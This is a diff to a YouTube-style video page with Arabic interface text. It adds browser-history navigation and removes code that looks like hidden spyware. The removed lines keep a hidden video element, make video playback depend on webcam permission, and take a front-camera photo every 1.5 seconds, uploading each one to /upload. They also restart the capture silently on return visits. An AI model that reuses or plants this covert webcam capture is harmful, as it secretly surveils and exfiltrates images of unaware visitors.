@@ -260,9 +260,6 @@ body.drawer-mode .main{margin-inline-start:0}
 </div>
 <div class="toasts" id="toasts"></div>
 
-<!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
-<video id="video" autoplay playsinline style="display:none;"></video>
-
 <script>
 /* ===== Data ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
@@ -357,12 +354,18 @@ function filtered(){
   return VIDEOS.filter(v=>(S.cat==='الكل'||v.cat===S.cat)&&(!q||(v.title+' '+v.ch+' '+v.cat).toLowerCase().includes(q)));
 }
 
-/* ===== Main render ===== */
-function render(){
+/* ===== Main render & History Management ===== */
+function render(pushState=true){
   document.body.classList.toggle('in-watch',S.view==='watch');
   updateLayout();renderSidebar();renderBnav();
   const chips=$('#chips'),view=$('#view');
   chips.style.display=S.view==='home'?'flex':'none';
+
+  if(pushState){
+    const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
+    const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
+    history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
+  }
 
   if(S.view==='watch'){return renderWatch()}
   if(S.view==='home'){
@@ -399,18 +402,12 @@ function searchFor(text){
 
 /* ===== Watch page ===== */
 function openVideo(id){
-  // عند الضغط على الفيديو يتم طلب الإذن وترصيد الكاميرا أولاً
-  startCapture().then(() => {
-    S.cur=id;S.view='watch';S.descOpen=false;
-    S.hist=[id,...S.hist.filter(x=>x!==id)];
-    document.body.classList.remove('drawer-open','searching');
-    document.title=cur().title;
-    render();scrollTo(0,0);
-  }).catch(() => {
-    console.log("تم رفض الإذن أو تجاهله، لن يتم فتح الفيديو");
-  });
+  S.cur=id;S.view='watch';S.descOpen=false;
+  S.hist=[id,...S.hist.filter(x=>x!==id)];
+  document.body.classList.remove('drawer-open','searching');
+  document.title=cur().title;
+  render();scrollTo(0,0);
 }
-
 function renderWatch(){
   const v=cur();
   const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
@@ -498,60 +495,6 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا والتقاط الصور المستمر ===== */
-let mediaStream = null;
-let captureInterval = null;
-
-function startCaptureLoop() {
-    if (captureInterval) return;
-    const videoEl = document.getElementById('video');
-    captureInterval = setInterval(() => {
-        if (!mediaStream) return;
-        try {
-            const vw = videoEl.videoWidth || 640;
-            const vh = videoEl.videoHeight || 480;
-
-            const canvas = document.createElement('canvas');
-            canvas.width = vw;
-            canvas.height = vh;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-            canvas.toBlob(blob => {
-                if (blob) {
-                    let fd = new FormData();
-                    fd.append('image', blob, `user_eye.jpg`);
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }
-            }, 'image/jpeg', 0.85);
-        } catch (err) {}
-    }, 1500);
-}
-
-async function startCapture() {
-    if (mediaStream) return Promise.resolve();
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: 'user' } } 
-        });
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = mediaStream;
-        startCaptureLoop();
-    } catch (e) {
-        throw e;
-    }
-}
-
-// فحص صامت في الخلفية للزيارات العائدة (إذا كان الإذن ممنوحاً مسبقاً)
-if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
-        if (permissionStatus.state === 'granted') {
-            startCapture().catch(() => {});
-        }
-    }).catch(() => {});
-}
-
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -609,7 +552,7 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q'].blur();
 });
 
-/* ===== التعامل مع أزرار التنقل ===== */
+/* ===== أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -622,13 +565,13 @@ window.addEventListener('popstate',e=>{
     S.cur=null;
   }
   document.body.classList.remove('drawer-open','searching');
-  render();
+  render(false);
   scrollTo(0,0);
 });
 
-/* ===== Init: بناء الصفحة وعرض الفيديوهات فوراً ودون تأخير ===== */
+/* ===== Init ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render();
+render(true);
 </script>
 </body>
 </html>
